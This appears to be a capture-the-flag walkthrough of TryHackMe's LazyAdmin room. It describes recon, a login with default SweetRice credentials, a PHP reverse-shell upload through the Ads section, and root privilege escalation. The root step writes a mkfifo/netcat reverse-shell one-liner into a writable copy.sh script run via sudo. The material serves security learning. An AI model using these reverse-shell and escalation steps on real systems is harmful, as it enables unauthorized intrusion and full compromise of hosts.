# LazyAdmin-THM Walkthrough

<img width="1343" alt="Screen Shot 2025-06-01 at 3 08 21 PM" src="https://github.com/user-attachments/assets/c9e361a7-3e48-429d-9b6d-589bb1c312b1" />

This is a writeup and my walkthrough of the LazyAdmin Room in TryHackMe.

# Step 1 Reconnaissance

After starting the machine first step is to conduct Recon and see what we are working with!

I have started with nmap to see what kind of ports we have open.

      nmap -A -T4 -O -v <MACHINE_IP>

<img width="805" alt="Screen Shot 2025-06-01 at 2 49 28 PM" src="https://github.com/user-attachments/assets/e6b66242-d78b-4069-b22c-54cfaee12f0d" />

We can clearly see we got port 80(HTTP) and port 22(SSH) open.
Let's visit the page in the browser and see what we are working with.

<img width="1678" alt="Screen Shot 2025-06-01 at 2 50 57 PM" src="https://github.com/user-attachments/assets/937fbe0b-4e57-41f6-85ac-73bfabca39d1" />

The page is just a default page, nothing interesting about it, so my next step to if I can find any directories to work with.

      gobuster dir -w /usr/share/wordlists/dirb/common.txt -u <MACHINE_IP>

I decided to use gobbuster for enumeration which gave me a few interesting resluts.

<img width="909" alt="Screen Shot 2025-06-01 at 2 51 26 PM" src="https://github.com/user-attachments/assets/b6029d86-98a4-4fe8-9cb9-7a59a4b4f289" />

The only thing that caught my attention was the '/content' directory, which I visited and saw its going to be where the rest of the directories are stored.

So I decided to enumrate the /content directory.

<img width="1005" alt="Screen Shot 2025-06-01 at 2 52 14 PM" src="https://github.com/user-attachments/assets/cc2ecc68-bbe2-4ebb-8043-62760f23ae07" />


Which returned a lot of different resluts for me so I started visiting them one by one until I got to the /as directory which returned the login page.
Taking in consideration the name LazyAdmin i though this is exactly where I needed to be and thought to research some default credentials for SweetRice.

<img width="1679" alt="Screen Shot 2025-06-01 at 2 54 01 PM" src="https://github.com/user-attachments/assets/66045e19-24a2-4539-ae21-99e048870e0d" />

<img width="708" alt="Screen Shot 2025-06-01 at 2 52 42 PM" src="https://github.com/user-attachments/assets/e87e6faf-0077-478d-97fd-a6375fbc8645" />

And I got username: manager and password: Password123

And got a succesfull login!

<img width="1680" alt="Screen Shot 2025-06-01 at 2 54 21 PM" src="https://github.com/user-attachments/assets/2657635e-1735-4975-8d6c-bbdcfa48086d" />


SIDENOTE: ALWAYS CHAGNE DEFAULT CREDENTIALS!

# Weaponization

At this point I have some good information.

We know we are using SweetRice and I have the version 1.5.1

So time for some research!

After researching SweetRice 1.5.1 Vulnerabilities, I found CSRF vulnerabilty using Arbitrary Code Execution through the Adding Ads section.

<img width="1679" alt="Screen Shot 2025-06-01 at 2 54 36 PM" src="https://github.com/user-attachments/assets/b3c89494-b1e9-47ab-bbdf-771924b43974" />

# Delivery

I there you can put PHP code which you can later execute!

I went to https://www.revshells.com/ and used the PentestMonkey PHP shell to uploads into ads.

<img width="1383" alt="Screen Shot 2025-06-01 at 2 55 05 PM" src="https://github.com/user-attachments/assets/24361beb-b8fc-409a-b45e-14e5d938d93b" />


<img width="1468" alt="Screen Shot 2025-06-01 at 2 55 19 PM" src="https://github.com/user-attachments/assets/3c80e6c7-27eb-4b46-be0d-b84d45133e45" />

<img width="1464" alt="Screen Shot 2025-06-01 at 2 55 32 PM" src="https://github.com/user-attachments/assets/57699627-320a-40d6-aa87-74488ec7f096" />

Called it "hacked" and went to the directory we found earlier that stores all the content > /content/inc

<img width="1680" alt="Screen Shot 2025-06-01 at 2 53 49 PM" src="https://github.com/user-attachments/assets/cd2edd5e-0d73-4cbe-a940-13c9c9076004" />

We can see there is the /ads folder, which is where out shell is most likely residing.

<img width="1680" alt="Screen Shot 2025-06-01 at 2 56 05 PM" src="https://github.com/user-attachments/assets/7434e8eb-3f01-416c-82cc-703736e023d3" />

And there she is hacked.php.

# Exploitation

Now we just need to start a nc listener on our machine and go and execute our php shell!

        nc -lvnp 4444
        
And we got a shell!

<img width="1680" alt="Screen Shot 2025-06-01 at 2 56 26 PM" src="https://github.com/user-attachments/assets/15025af0-def5-4d2e-9e5b-3e062041f941" />

Now lets create a psuedo termincal with a pty shell spawn.

      python -c 'import pty; pty.spawn("/bin/bash")'

Get to the home directory where we can see there is a directory called 'itguy'

Let navigate there and we find our user.txt flag!

<img width="761" alt="Screen Shot 2025-06-01 at 2 57 39 PM" src="https://github.com/user-attachments/assets/19749d22-4287-4451-8790-3e0d531a5a3c" />

# Privilege Escalation

Now we have to escalate our privileges to root to find the root.txt flag!

Lets go ahead and run 

      sudo -l
      
to see if we can performa and sudo commands.

<img width="991" alt="Screen Shot 2025-06-01 at 2 58 12 PM" src="https://github.com/user-attachments/assets/5d4d5e59-6cc4-474b-8396-984bd820b6fd" />

As you can see we are able to run /usr/bin/perl /home/itguy/backup.pl

Lets open up backup.pl and see what it does.

<img width="545" alt="Screen Shot 2025-06-01 at 2 58 38 PM" src="https://github.com/user-attachments/assets/0cf442b6-7043-4627-b4da-1aaacf323cde" />

backup.pl call another file called copy.sh which is writeable by our user and lets see what it does.

After reading the contents of the copy.sh it looks like it run another shell.

<img width="871" alt="Screen Shot 2025-06-01 at 2 58 55 PM" src="https://github.com/user-attachments/assets/f0102352-8544-4718-881a-8290355e5a6b" />

Now we just need to change the IP to our machine IP and set up another listener and we should get a shell to root.

So here there was no nano, vim , vi or any text editor so we can do an echo!

      echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <MACHINE_IP> <PORT> > /tmp/f" > /etc/copy.sh 

And now we setup our listener and execute backup.pl

<img width="1355" alt="Screen Shot 2025-06-01 at 3 00 59 PM" src="https://github.com/user-attachments/assets/2b1a8a7c-e8a9-421a-957c-3a9b5ecb0a5c" />

      sudo /usr/bin/perl /home/itguy/backup.pl


<img width="373" alt="Screen Shot 2025-06-01 at 3 04 02 PM" src="https://github.com/user-attachments/assets/6c764e1f-13fe-4f11-89b5-cb1f68c2396f" />

We got the shell!

Now we can cd to root!

And get our root.txt flag!

<img width="575" alt="Screen Shot 2025-06-01 at 3 02 05 PM" src="https://github.com/user-attachments/assets/525a9fa5-b516-4bf8-8ff7-21d7a61d6e91" />
